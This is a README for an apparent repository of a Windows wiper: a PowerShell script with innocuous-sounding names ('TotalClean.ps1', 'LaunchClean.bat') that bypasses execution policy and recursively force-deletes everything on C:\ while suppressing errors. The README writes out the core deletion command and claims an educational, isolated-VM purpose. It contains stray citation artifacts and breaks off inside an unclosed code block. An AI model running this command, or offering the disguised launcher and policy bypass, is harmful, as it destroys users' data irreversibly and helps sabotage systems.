# PowerShell Destructive 

**CRITICAL WARNING: THIS IS A DESTRUCTIVE SCRIPT.**
This repository contains a PowerShell script designed to recursively delete files on the primary system drive (`C:\`). It is intended strictly for educational purposes and authorized security testing within isolated, non-production environments (e.g., disposable Virtual Machines). Do not execute this script on any system containing valuable data.

---

## Overview
This project serves as a practical demonstration of built-in Windows administration commands utilized in a destructive manner. It highlights two primary concepts in offensive security and system administration:

1. **Execution Policy Override:** Bypassing local PowerShell execution restrictions using the `-ExecutionPolicy Bypass` flag via a batch wrapper[cite: 3, 4].
2. **Destructive File Manipulation:** Utilizing the `Remove-Item` cmdlet with recursive and forced parameters to simulate a catastrophic payload.

---

## Repository Contents

| File | Purpose |
| :--- | :--- |
| `TotalClean.ps1` | The core PowerShell script. It alters the console aesthetics, initiates a countdown sequence for visual effect, and executes the recursive deletion command. |
| `LaunchClean.bat` | A batch launcher designed to execute the PowerShell script with bypassed execution policies in a standard console window[cite: 3, 4]. |

---

## Technical Analysis
The core functionality of the script relies on the following command:

```powershell
Remove-Item -Path C:\* -Recurse -Force -ErrorAction SilentlyContinue
